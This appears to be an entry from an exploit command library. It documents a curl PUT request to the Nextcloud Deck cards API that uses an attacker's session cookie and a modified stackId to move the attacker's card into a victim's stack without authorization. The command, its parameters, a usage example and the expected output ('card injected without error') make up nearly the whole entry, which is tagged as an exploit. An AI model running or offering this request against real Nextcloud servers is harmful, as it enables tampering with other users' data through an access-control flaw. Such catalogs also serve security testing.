---
data: >-
  curl -X PUT 'https://nextcloud.example.com/apps/deck/cards/13' -H
  'Content-Type: application/json' -H 'OCS-APIRequest: true' -H 'Cookie:
  nc_username=attacker; nc_token=session_token' -d
  '{"title":"SOME_TEST","description":"","stackId":6,"type":"plain","lastModified":1588755341,"lastEditor":null,"createdAt":1588755341,"labels":null,"assignedUsers":null,"attachments":null,"attachmentCount":null,"owner":"attacker","order":999,"archived":false,"duedate":null,"deletedAt":0,"commentsUnread":0,"id":13,"overdue":0}'
tags:
  - api
  - nextcloud
  - exploit
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:19.802Z'
id: b2b00214-cd59-41d2-a19f-c53838feed5d
verified: false
validated: true
submitted: true
---
# put-move-deck-card-target

## Command

```bash
curl -X PUT 'https://nextcloud.example.com/apps/deck/cards/13' \
  -H 'Content-Type: application/json' \
  -H 'OCS-APIRequest: true' \
  -H 'Cookie: nc_username=attacker; nc_token=session_token' \
  -d '{"title":"SOME_TEST","description":"","stackId":6,"type":"plain","lastModified":1588755341,"lastEditor":null,"createdAt":1588755341,"labels":null,"assignedUsers":null,"attachments":null,"attachmentCount":null,"owner":"attacker","order":999,"archived":false,"duedate":null,"deletedAt":0,"commentsUnread":0,"id":13,"overdue":0}'
```

## Description

Exploits by moving a card to an unauthorized stack (victim's) via modified stackId.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| id | Card ID | Yes |
| stackId | Victim's stack ID (e.g., 6) | Yes |
| owner | Remains attacker's | Yes |

## Examples

### Basic Usage

```bash
curl -X PUT 'https://nextcloud.example.com/apps/deck/cards/13' -H 'Content-Type: application/json' -H 'OCS-APIRequest: true' -H 'Cookie: nc_username=attacker; nc_token=session_token' -d '{"stackId":6,...}'
```

## Expected Output

200 OK; card injected without error.

## Related

- [[commands/put-move-deck-card-own]]
